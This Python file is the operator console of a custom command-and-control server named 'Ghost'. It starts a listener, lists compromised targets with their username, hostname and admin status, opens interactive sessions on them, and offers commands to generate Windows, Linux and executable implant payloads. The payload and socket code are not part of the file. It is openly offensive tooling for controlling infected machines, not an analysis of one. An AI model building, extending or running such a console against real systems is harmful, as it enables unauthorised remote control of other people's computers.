from prettytable import PrettyTable

class Cli:
    def __init__(self):
        self.print_banner()
        self.is_running = False

    def print_banner(self):
        print("   ________               __     __  ")       
        print("  / ____/ /_  ____  _____/ /_    \ \      ")  
        print(" / / __/ __ \/ __ \/ ___/ __/     \ \   ")    
        print("/ /_/ / / / / /_/ (__  ) /_       / /       ")
        print("\____/_/ /_/\____/____/\__/      /_/  ______")
        print("                                     /_____/")
        print("Custom Command And Control Server")
        print("By SafeAndSound - v. 1.0\n")

    def run(self, server, attacker):
        self.is_running = True
        while self.is_running:
            try:
                self.is_running = self.handle_commands(server, attacker)
            except KeyboardInterrupt:
                print("\n\n[-] Keyboard interrupt was issued.")
                server.close_all_connections()
                break
    
    """
    List of supported commands:
    sessions, cd, ls, listen, help, exit
    """
    def handle_commands(self, server, attacker):
        if server.is_listening:
            command = input("(listening) Enter_command#> ").strip()
        else:
            command = input("Enter_command#> ").strip()
        # void command
        if command == "":
            pass
        # "listem" without arguments (help)
        elif command == "listen":
            print("Usage : listen [flag]")
            print("    -l           show current listener ip and port")
            print("    -s           set listener to ip and port of choice")
            print("    -k           kill current listener")
            print("")
        # "listen -s" command to start listener
        elif command == "listen -s":
            if server.is_listening:
                print("Already listening. Use 'listen -l' to display info.\n")
            else:
                input_ip = input("\n[+] Enter the IP to listen on : ")
                input_port = input("[+] Enter the port to listen on : ")
                try:
                    server.prepare_socket_thread(input_ip, input_port)
                    server.is_listening = True
                    server.host_ip = input_ip
                    server.host_port = input_port
                except Exception:
                    print("\n[-] Values provided are not valid.\n")
        # "listen -l" command to show what's listening
        elif command == "listen -l":
            if not server.is_listening:
                print("Not listening.\n")
            else:
                host_ip = server.current_socket.getsockname()[0]
                host_port = server.current_socket.getsockname()[1]
                print(f"Listening on network interface {host_ip} through port {host_port}.\n")
        # "listen -k" command to kill listener
        elif command == "listen -k":
            if server.is_listening:
                server.is_listening = False
                server.close_all_connections()
                server.reset()
            else:
                print("Not listening. There is nothing to kill.\n")
        # "winplant" command to generate windows payload
        elif command == "winplant":
            if server.is_listening:
                attacker.winplant(server)
            else:
                print("\n[-] You cannot generate a payload without an active listener.\n")
        # "linplant" command to generate linux payload
        elif command == "linplant":
            if server.is_listening:
                attacker.linplant(server)
            else:
                print("\n[-] You cannot generate a payload without an active listener.\n")
        # "exeplant" command to generate executable payload
        elif command == "exeplant":
            if server.is_listening:
                attacker.exeplant(server)
            else:
                print("\n[-] You cannot generate a payload without an active listener.\n")
        # "sessions" without arguments (help)
        elif command == "sessions":
            print("Usage : sessions [flag] [value]")
            print("    -l           list all sessions")
            print("    -i <num>     interact with session number <num>")
            print("")
        # "sessions -l" (and alias "ls")
        elif command == "sessions -l" or command == "ls":
            session_counter = 1
            sessions_table = PrettyTable()
            sessions_table.field_names = ["Session", "Target", "Username", "Admin", "Status", "Check-in time"]
            sessions_table.padding_width = 3
            for target in server.list_of_targets:
                fullname = str(target[1])
                if target[3] is not None:
                    fullname = str(target[3]) + "@" + fullname
                # list_of_targets structure : list with 
                #                               [0]target_id 
                #                               [1]target_ip 
                #                               [2]time_record 
                #                               [3]hostname 
                #                               [4]is_admin
                #                               [5]username
                sessions_table.add_row([session_counter, fullname, target[5], target[4], "", target[2]])
                session_counter += 1
            print(f"{sessions_table}\n")
        # "sessions -i <num>"
        elif (command.split()[0] == "sessions") and (command.split()[1] == "-i"):
            try:
                num = int(command.split()[2]) - 1
                if 0 <= num < len(server.list_of_targets):
                    print(f"\n[+] Entering session {num+1}...\n")
                    server.handle_single_target_communication(num)
                else:
                    print("Out of bound value provided. Use 'sessions -l' to list sessions.\n")
            except IndexError:
                print("Missing argument. Usage : 'sessions -i <session_number>'\n")
            except ValueError:
                print("Value provided is not an integer.\n")
        # "cd" alias for "sessions -i"
        elif command.split()[0] == "cd":
            try:
                num = int(command.split()[1]) - 1
                if 0 <= num < len(server.list_of_targets):
                    print(f"\n[+] Entering session {num+1}...\n")
                    server.handle_single_target_communication(num)
                else:
                    print("Out of bound value provided. Use 'sessions -l' or 'ls' to list sessions.\n")
            except IndexError:
                print("Missing argument. Usage : 'cd <session_number>'\n")
            except ValueError:
                print("Value provided is not an integer.\n")
        # "exit"
        elif command == "exit":
            server.close_all_connections()
            return False
        elif command == "help":
            print("Help is coming...\n")
            # TODO make help output
        # unknown commands
        else:
            print("Unkown command. Type 'help' for a list of accepted commands.\n")
        return True